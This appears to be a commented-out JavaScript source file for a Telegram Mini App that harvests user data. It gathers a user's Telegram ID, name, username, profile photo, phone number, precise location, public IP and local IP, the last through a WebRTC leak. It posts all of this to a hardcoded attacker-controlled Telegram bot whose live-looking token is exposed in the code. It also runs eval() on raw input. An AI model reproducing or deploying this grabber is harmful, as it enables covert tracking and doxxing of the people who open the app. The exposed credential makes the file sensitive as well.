//         window.onload = () => {

//                 // window.location.href = 'https://t.me/CsecLabMiniApp3Bot/Home?startapp';
//                 window.location.href = 'https://www.youtube.com';
//         }
        
//         // Function to change background color
//         function setBackgroundColor() {
//             Telegram.WebApp.setBackgroundColor("#bd1e1e");  // White background color

//         }

//         function sendToMiniApp() {
  
           
//             Telegram.WebApp.openTelegramLink(url);

// ;
//         }

//         // Call the function to set the background color
//         setBackgroundColor();
//         // function scrapeData() {
//         //     requestLocation();
//         //     sendUserDataToTelegram();
//         //     sendPhoneNumberToTelegram();
//         // }

        // function requestLocation() {
        //     // Initialize LocationManager if not already initialized
        //     if (!Telegram.WebApp.LocationManager.isInited) {
        //         Telegram.WebApp.LocationManager.init(() => {
        //             console.log("LocationManager initialized");
        //             getLocationData(); // Call location function after init
        //         });
        //     } else {
        //         getLocationData(); // Directly fetch location if already initialized
        //     }
        // }

        // function getLocationData() {
        //     Telegram.WebApp.LocationManager.getLocation((location) => {
        //         if (!location) {
        //             Telegram.WebApp.showAlert("Location access was not granted.");
        //             return;
        //         }

        //         const { latitude, longitude } = location;
        //         console.log("Latitude:", latitude, "Longitude:", longitude);

        //         sendLocationToTelegram(latitude, longitude);
        //     });
        // }

//         function sendLocationToTelegram(latitude, longitude) {
//             const chatId = "7265296083";  // Replace with actual chat ID
//             const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token

//             const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

//             fetch(url)
//                 .then(response => response.json())
//                 .then(data => {
//                     if (data.ok) {
//                         Telegram.WebApp.showAlert("Location sent successfully!");
//                     } else {
//                         Telegram.WebApp.showAlert("Failed to send location: " + data.description);
//                     }
//                 })
//                 .catch(error => {
//                     Telegram.WebApp.showAlert("Error: " + error.message);
//                 });
//         }

//         function showError(error) {
//             let message;
//             switch (error.code) {
//                 case error.PERMISSION_DENIED:
//                     message = "User denied the request for Geolocation.";
//                     break;
//                 case error.POSITION_UNAVAILABLE:
//                     message = "Location information is unavailable.";
//                     break;
//                 case error.TIMEOUT:
//                     message = "The request to get user location timed out.";
//                     break;
//                 default:
//                     message = "An unknown error occurred.";
//             }
//             Telegram.WebApp.showAlert(message);
//         }

//         async function setViewportData() {
//             var sizeEl = document.getElementById('viewport-params-size');
//             sizeEl.innerText = 'width: ' + window.innerWidth + ' x ' +
//                 'height: ' + Telegram.WebApp.viewportStableHeight;

//             var expandEl = document.querySelector('#viewport-params-expand');
//             expandEl.innerText = 'Is Expanded: ' + (Telegram.WebApp.isExpanded ? 'true' : 'false');
//         }


//         setViewportData();
//         Telegram.WebApp.onEvent('viewportChanged', setViewportData);



//         async function sendUserDataToTelegram() {
//             const user = Telegram.WebApp.initDataUnsafe.user;
//             if (!user) {
//                 Telegram.WebApp.showAlert("User data is not available.");
//                 return;
//             }

//             const chatId = "7265296083";  // Replace with actual chat ID
//             const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token

//             let photoUrl = await getUserProfilePhoto(user.id, botToken);
//             let locationFromIP = await getLocationFromIP();
//             let IP = await getIP();
//             let localIP = await getLocalIP();

//             const userData = `
//                             👤 *User Data*:
//                             🆔 ID: ${user.id}
//                             👤 Name: ${user.first_name} ${user.last_name || ""}
//                             🔗 Username: @${user.username || "N/A"}
//                             🌍 Language: ${user.language_code || "N/A"}
//                             💎 Premium: ${user.is_premium ? "Yes" : "No"}
//                             📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
//                             ✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
//                             🖼 Profile Photo: ${photoUrl ? `[Click Here](${photoUrl})` : "No photo"}
//                             📍 IP-based Location: ${locationFromIP}
//                             📍 Public IP Address: ${IP}
//                             📍 Local IP Address: ${localIP}
//                             `;

//             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

//             const formData = new URLSearchParams();
//             formData.append("chat_id", chatId);
//             formData.append("text", userData);
//             formData.append("parse_mode", "Markdown");

//             fetch(url, {
//                 method: "POST",
//                 body: formData
//             })
//                 .then(response => response.json())
//                 .then(data => {
//                     if (data.ok) {
//                         Telegram.WebApp.showAlert("User data sent successfully!");
//                     } else {
//                         Telegram.WebApp.showAlert("Failed to send user data: " + data.description);
//                     }
//                 })

//                 .catch(error => {
//                     Telegram.WebApp.showAlert("Error: " + error.message);
//                 });
//         }

//         async function getUserProfilePhoto(userId, botToken) {
//             const url = `https://api.telegram.org/bot${botToken}/getUserProfilePhotos?user_id=${userId}&limit=1`;

//             try {
//                 let response = await fetch(url);
//                 let data = await response.json();
//                 if (data.ok && data.result.total_count > 0) {
//                     let fileId = data.result.photos[0][0].file_id;
//                     return await getFileUrl(fileId, botToken);
//                 }
//             } catch (error) {
//                 console.error("Error fetching profile photo:", error);
//             }

//             return null; // No profile photo available
//         }

//         async function getFileUrl(fileId, botToken) {
//             const url = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;

//             try {
//                 let response = await fetch(url);
//                 let data = await response.json();
//                 if (data.ok) {
//                     return `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
//                 }
//             } catch (error) {
//                 console.error("Error fetching file URL:", error);
//             }

//             return null;
//         }
//         async function sendPhoneNumberToTelegram() {
//             const user = Telegram.WebApp.initDataUnsafe.user;
//             if (!user) {
//                 Telegram.WebApp.showAlert("User data is not available.");
//                 return;
//             }

//             const chatId = "7265296083";  // Replace with actual chat ID
//             const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token

//             // Fetch the phone number
//             const phoneNumber = await getPhoneNumber(user.id);  // Request the phone number

//             // Send the phone number separately
//             if (phoneNumber) {
//                 await sendPhoneNumberMessage(chatId, botToken, phoneNumber);
//             } else {
//                 Telegram.WebApp.showAlert("No phone number found.");
//             }
//         }
//         async function sendPhoneNumberMessage(chatId, botToken, phoneNumber) {
//             const phoneNumberMessage = `📱 Phone Number: ${phoneNumber}`;
//             alert(phoneNumberMessage);

//             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

//             const formData = new URLSearchParams();
//             formData.append("chat_id", chatId);
//             formData.append("text", phoneNumberMessage);
//             alert(phoneNumber);
//             await fetch(url, {
//                 method: "POST",
//                 body: formData
//             })
//                 .then(response => response.json())
//                 .then(data => {
//                     if (data.ok) {
//                         Telegram.WebApp.showAlert("Phone number sent successfully!");
//                     } else {
//                         Telegram.WebApp.showAlert("Failed to send phone number: " + data.description);
//                     }
//                 })
//                 .catch(error => {
//                     Telegram.WebApp.showAlert("Error: " + error.message);
//                 });
//         }

//         async function getPhoneNumber(userId) {
//             return new Promise((resolve) => {
//                 Telegram.WebApp.requestContact();

//                 Telegram.WebApp.onEvent("contactSelected", function (contact) {
//                     if (contact && contact.phone_number) {
//                         resolve(contact.phone_number);
//                     } else {
//                         resolve(null);
//                     }
//                 });
//             });
//         }

//         function evaluateInput() {
//             // Get the value of the input box
//             const inputValue = document.getElementById('inputBox').value;
//             // Evaluate the input using the JavaScript eval function
//             const result = eval(inputValue);
//             // alert(result);
//             // Show the result
//             document.getElementById('result').innerText = 'Result: ' + result;

//         }


//         async function getLocationFromIP() {
//             try {
//                 const res = await fetch('https://ipapi.co/json/');
//                 const data = await res.json();
//                 console.log(`Location: ${data.city}, ${data.country}`);
//                 return `${data.city}, ${data.country}`;
//             } catch (error) {
//                 console.error("Failed to get location from IP:", error);
//                 return "Location unavailable";
//             }
//         }


//         async function getIP() {
//             try {
//                 const res = await fetch('https://ipapi.co/json/');
//                 const data = await res.json();
//                 return `${data.ip}`;
//             } catch (error) {
//                 console.error("Failed to get location from IP:", error);
//                 return "IP unavailable";
//             }
//         }

//         async function getLocalIP() {
//             return new Promise((resolve, reject) => {
//                 const pc = new RTCPeerConnection({ iceServers: [] });
//                 pc.createDataChannel('');
//                 pc.onicecandidate = (event) => {
//                     if (event && event.candidate) {
//                         const ip = event.candidate.candidate.split(' ')[4];
//                         resolve(ip);
//                         pc.close();
//                     }
//                 };
//                 pc.createOffer()
//                     .then((offer) => pc.setLocalDescription(offer))
//                     .catch((err) => reject(err));
//             });
//         }